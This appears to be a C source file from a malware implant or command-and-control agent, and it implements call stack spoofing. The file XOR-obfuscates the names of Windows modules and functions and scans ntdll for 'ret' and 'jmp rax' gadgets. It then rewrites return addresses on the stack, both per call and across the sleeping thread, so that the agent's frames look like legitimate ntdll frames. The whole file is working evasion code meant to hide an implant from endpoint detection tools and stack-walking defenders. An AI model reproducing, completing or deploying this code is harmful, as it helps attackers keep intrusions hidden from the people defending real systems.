/*
 * stack_spoof.c — Call stack spoofing implementation.
 */
#include "agent.h"
#include "stack_spoof.h"
#include "api_resolve.h"

GADGET_CACHE g_GadgetCache = {0};

/* ─── PE helpers ─── */

static void _get_module_range(HMODULE hMod, void **base, DWORD *size) {
    *base = NULL;
    *size = 0;
    if (!hMod) return;

    PIMAGE_DOS_HEADER dos = (PIMAGE_DOS_HEADER)hMod;
    if (dos->e_magic != IMAGE_DOS_SIGNATURE) return;

    PIMAGE_NT_HEADERS nt = (PIMAGE_NT_HEADERS)((BYTE *)hMod + dos->e_lfanew);
    if (nt->Signature != IMAGE_NT_SIGNATURE) return;

    *base = (void *)hMod;
    *size = nt->OptionalHeader.SizeOfImage;
}

/*
 * Scan a module's .text section for a byte pattern.
 * Returns the address of the first match, or NULL.
 */
static void *_find_gadget(HMODULE hMod, const unsigned char *pattern, SIZE_T patLen) {
    if (!hMod || !pattern || patLen == 0) return NULL;

    PIMAGE_DOS_HEADER dos = (PIMAGE_DOS_HEADER)hMod;
    PIMAGE_NT_HEADERS nt = (PIMAGE_NT_HEADERS)((BYTE *)hMod + dos->e_lfanew);
    PIMAGE_SECTION_HEADER section = IMAGE_FIRST_SECTION(nt);
    WORD numSections = nt->FileHeader.NumberOfSections;

    for (WORD i = 0; i < numSections; i++) {
        if (memcmp(section[i].Name, ".text", 5) != 0)
            continue;

        unsigned char *start = (unsigned char *)hMod + section[i].VirtualAddress;
        DWORD textSize = section[i].Misc.VirtualSize;

        if (textSize < patLen) continue;

        for (DWORD j = 0; j <= textSize - patLen; j++) {
            if (memcmp(start + j, pattern, patLen) == 0) {
                return start + j;
            }
        }
        break; /* Only scan .text */
    }
    return NULL;
}

/* ═══════════════════════════════════════════════════════════════════
 *  Initialization
 * ═══════════════════════════════════════════════════════════════════ */

BOOL spoof_init(void) {
    if (g_GadgetCache.initialized) return TRUE;

    char _sn[] = {'n'^0x5A,'t'^0x5A,'d'^0x5A,'l'^0x5A,'l'^0x5A,'.'^0x5A,'d'^0x5A,'l'^0x5A,'l'^0x5A,0};
    for(int _i=0;_sn[_i];_i++) _sn[_i]^=0x5A;
    HMODULE hNtdll = GetModuleHandleA(_sn);
    SecureZeroMemory(_sn, sizeof(_sn));

    char _sk[] = {'k'^0x5A,'e'^0x5A,'r'^0x5A,'n'^0x5A,'e'^0x5A,'l'^0x5A,'3'^0x5A,'2'^0x5A,'.'^0x5A,'d'^0x5A,'l'^0x5A,'l'^0x5A,0};
    for(int _i=0;_sk[_i];_i++) _sk[_i]^=0x5A;
    HMODULE hK32 = GetModuleHandleA(_sk);
    SecureZeroMemory(_sk, sizeof(_sk));

    if (!hNtdll || !hK32) return FALSE;

    _get_module_range(hNtdll, &g_GadgetCache.ntdllBase, &g_GadgetCache.ntdllSize);
    _get_module_range(hK32, &g_GadgetCache.kernel32Base, &g_GadgetCache.kernel32Size);

    /* Find `ret` gadget (C3) in ntdll */
    unsigned char retPattern[] = { 0xC3 };
    g_GadgetCache.retGadget = _find_gadget(hNtdll, retPattern, 1);

    /* Find `jmp rax` gadget (FF E0) in ntdll */
    unsigned char jmpRaxPattern[] = { 0xFF, 0xE0 };
    g_GadgetCache.jmpRaxGadget = _find_gadget(hNtdll, jmpRaxPattern, 2);

    /* Resolve well-known frame anchors */
    char _sb[] = {'B'^0x5A,'a'^0x5A,'s'^0x5A,'e'^0x5A,'T'^0x5A,'h'^0x5A,'r'^0x5A,'e'^0x5A,'a'^0x5A,'d'^0x5A,'I'^0x5A,'n'^0x5A,'i'^0x5A,'t'^0x5A,'T'^0x5A,'h'^0x5A,'u'^0x5A,'n'^0x5A,'k'^0x5A,0};
    for(int _i=0;_sb[_i];_i++) _sb[_i]^=0x5A;
    g_GadgetCache.baseThreadInitThunk =
        (void *)GetProcAddress(hK32, _sb);
    SecureZeroMemory(_sb, sizeof(_sb));

    char _sr[] = {'R'^0x5A,'t'^0x5A,'l'^0x5A,'U'^0x5A,'s'^0x5A,'e'^0x5A,'r'^0x5A,'T'^0x5A,'h'^0x5A,'r'^0x5A,'e'^0x5A,'a'^0x5A,'d'^0x5A,'S'^0x5A,'t'^0x5A,'a'^0x5A,'r'^0x5A,'t'^0x5A,0};
    for(int _i=0;_sr[_i];_i++) _sr[_i]^=0x5A;
    g_GadgetCache.rtlUserThreadStart =
        (void *)GetProcAddress(hNtdll, _sr);
    SecureZeroMemory(_sr, sizeof(_sr));

    g_GadgetCache.initialized =
        (g_GadgetCache.retGadget != NULL);

    return g_GadgetCache.initialized;
}

/* ═══════════════════════════════════════════════════════════════════
 *  Per-call stack spoofing (return address masking)
 * ═══════════════════════════════════════════════════════════════════ */

/*
 * Replace the return address on the current stack frame.
 *
 * On x64, the return address is at [RSP] when we enter this function.
 * But since we're called from user code, the return address we want
 * to replace is one frame up — the caller's caller's return.
 *
 * In practice: the call chain is:
 *   user_code() → spoof_begin() → [we're here]
 * We want to mask user_code's return address so that when
 * user_code calls NtXxx, the NtXxx's stack walk sees a legit return.
 *
 * We use _AddressOfReturnAddress() (MSVC intrinsic) or inline asm.
 */

#if defined(__GNUC__) && (defined(__x86_64__) || defined(_M_X64))

void spoof_begin(SPOOF_CONTEXT *ctx) {
    if (!ctx || !g_GadgetCache.initialized) {
        if (ctx) ctx->active = FALSE;
        return;
    }

    void *retAddrLocation = NULL;

    /*
     * Get the address of the return address on the stack.
     * __builtin_frame_address(0) gives us the current frame pointer.
     * The return address is at RBP+8 in the standard frame layout,
     * but GCC may not use frame pointers with -fomit-frame-pointer.
     *
     * Alternative: use __builtin_return_address(0) to READ it,
     * but we also need to WRITE it.
     *
     * Safest approach: use inline asm to read RSP-relative.
     */
    void *currentRetAddr = __builtin_return_address(0);

    /*
     * We can't directly modify the return address through a builtin.
     * Instead, we walk the stack manually using RBP chain.
     *
     * NOTE: This requires -fno-omit-frame-pointer for reliability.
     * With frame pointer omission, stack walking is unreliable.
     */
    void **rbp;
    __asm__ __volatile__("mov %%rbp, %0" : "=r"(rbp));

    /* rbp[0] = saved RBP of caller
     * rbp[1] = return address of caller (= where spoof_begin returns to)
     * We want to go one frame further:
     * caller's rbp = rbp[0]
     * caller's caller return addr = ((void**)rbp[0])[1]
     */
    void **callerRbp = (void **)rbp[0];
    if (!callerRbp) {
        ctx->active = FALSE;
        return;
    }

    /* Save original return address */
    ctx->originalRetAddr = callerRbp[1];
    ctx->framePointer = callerRbp;
    ctx->gadgetAddr = g_GadgetCache.retGadget;

    /* Replace with a `ret` gadget inside ntdll */
    callerRbp[1] = g_GadgetCache.retGadget;
    ctx->active = TRUE;
}

void spoof_end(SPOOF_CONTEXT *ctx) {
    if (!ctx || !ctx->active) return;

    /* Restore original return address */
    void **callerRbp = (void **)ctx->framePointer;
    if (callerRbp) {
        callerRbp[1] = ctx->originalRetAddr;
    }

    ctx->active = FALSE;
}

#else
/* Fallback: no-op on non-x64 or non-GCC */
void spoof_begin(SPOOF_CONTEXT *ctx) {
    if (ctx) ctx->active = FALSE;
}
void spoof_end(SPOOF_CONTEXT *ctx) {
    (void)ctx;
}
#endif

/* ═══════════════════════════════════════════════════════════════════
 *  Thread stack spoofing (for sleep)
 * ═══════════════════════════════════════════════════════════════════ */

/*
 * Saved stack state for restoration after sleep.
 */
typedef struct _SAVED_STACK_FRAMES {
    struct {
        void **location;    /* Address on stack where return addr lives */
        void  *original;    /* Original return address value */
    } frames[64];
    int count;
} SAVED_STACK_FRAMES;

static BOOL _addr_in_module(void *addr, void *base, DWORD size) {
    return (addr >= base && addr < (void *)((BYTE *)base + size));
}

static BOOL _addr_in_agent(void *addr) {
    HMODULE hSelf = GetModuleHandleA(NULL);
    if (!hSelf) return FALSE;

    PIMAGE_DOS_HEADER dos = (PIMAGE_DOS_HEADER)hSelf;
    PIMAGE_NT_HEADERS nt = (PIMAGE_NT_HEADERS)((BYTE *)hSelf + dos->e_lfanew);

    void *base = (void *)hSelf;
    DWORD size = nt->OptionalHeader.SizeOfImage;

    return _addr_in_module(addr, base, size);
}

BOOL spoof_thread_stack(void **savedCtx) {
    if (!savedCtx || !g_GadgetCache.initialized) return FALSE;

#if defined(__GNUC__) && (defined(__x86_64__) || defined(_M_X64))
    SAVED_STACK_FRAMES *saved = (SAVED_STACK_FRAMES *)HeapAlloc(
        GetProcessHeap(), HEAP_ZERO_MEMORY, sizeof(SAVED_STACK_FRAMES));
    if (!saved) return FALSE;

    /* Walk RBP chain */
    void **rbp;
    __asm__ __volatile__("mov %%rbp, %0" : "=r"(rbp));

    int count = 0;
    while (rbp && count < 64) {
        void *retAddr = rbp[1];
        if (!retAddr) break;

        /* If this return address points into the agent, spoof it */
        if (_addr_in_agent(retAddr)) {
            saved->frames[count].location = &rbp[1];
            saved->frames[count].original = retAddr;

            /* Replace with a gadget inside ntdll */
            rbp[1] = g_GadgetCache.retGadget;
            count++;
        }

        /* Walk to next frame */
        void **nextRbp = (void **)rbp[0];
        /* Sanity: next RBP should be higher on stack (stack grows down) */
        if (nextRbp <= rbp) break;
        rbp = nextRbp;
    }

    saved->count = count;
    *savedCtx = saved;

    return count > 0;
#else
    (void)savedCtx;
    return FALSE;
#endif
}

void spoof_restore_thread_stack(void *savedCtx) {
    if (!savedCtx) return;

    SAVED_STACK_FRAMES *saved = (SAVED_STACK_FRAMES *)savedCtx;

    for (int i = 0; i < saved->count; i++) {
        if (saved->frames[i].location) {
            *saved->frames[i].location = saved->frames[i].original;
        }
    }

    SecureZeroMemory(saved, sizeof(SAVED_STACK_FRAMES));
    HeapFree(GetProcessHeap(), 0, saved);
}
